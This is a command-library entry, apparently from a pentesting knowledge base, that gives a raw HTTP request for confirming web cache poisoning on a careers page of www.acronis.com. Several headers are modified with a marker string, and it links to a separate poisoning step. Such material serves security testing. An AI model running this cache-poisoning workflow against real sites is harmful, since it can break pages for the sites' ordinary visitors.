---
data: >-
  GET /zh-cn/careers/ HTTP/1.1

  Host: www.acronis.com

  Connection: close

  sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"

  sec-ch-ua-mobile: ?0

  Upgrade-Insecure-Requests: 1

  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,
  text/yig1bt7ai4

  Sec-Fetch-Site: same-origin

  Sec-Fetch-Mode: navigate

  Sec-Fetch-User: ?1

  Sec-Fetch-Dest: document

  Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/

  Accept-Encoding: gzip, deflate, yig1bt7ai4

  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
tags:
  - http
  - verification
type: command
executor: bash
platforms:
  - Web
id: 03d8ea09-5c9d-4cfa-8df8-cf02b70e861a
created_at: '2025-12-13T09:00:34.172Z'
updated_at: '2025-12-13T09:00:34.172Z'
verified: false
validated: true
submitted: true
---
# Clean Request to Confirm Poisoning

## Command

```bash
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```

## Description

Sends a clean HTTP request without poisoning parameters to hit and confirm the poisoned cache, used after initial poisoning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `User-Agent` | Modified to include arbitrary string | Yes |
| `Accept` | Modified to include arbitrary text | Yes |
| `Accept-Encoding` | Modified to include arbitrary encoding | Yes |

## Examples

### Basic Usage

```bash
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
```

### Advanced Usage

```bash
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
User-Agent: Mozilla/5.0 ... yig1bt7ai4
Accept: text/html,... text/yig1bt7ai4
```

## Expected Output

Poisoned response from cache, showing broken functionality.

## Related

- [[procedures/Confirm-Cache-Poisoning]]
- [[commands/poison-request-x-forwarded-port]]
